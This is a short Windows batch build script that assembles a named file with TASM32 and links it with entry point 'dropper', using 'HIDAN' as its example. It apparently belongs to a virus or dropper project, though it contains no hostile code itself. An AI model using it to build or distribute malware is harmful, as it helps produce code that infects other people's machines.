@echo off
if %1.==. goto usage
%tasm32%\bin\tasm32 /r /ml /m9 /os /p /q /w2 /zn %1
if errorlevel 1 goto end
link %1 /subsystem:windows /entry:dropper %lib%\kernel32.lib %lib%\user32.lib ida.lib
del %1.obj
goto end

:usage
echo.
echo Usage: MAKE filename
echo eg. MAKE HIDAN
echo requires %%tasm32%% set to TASM directory (eg C:\TASM)
echo requires path set to Visual C directory for LINK
echo and %%lib%% set to Lib directory

:end
echo.
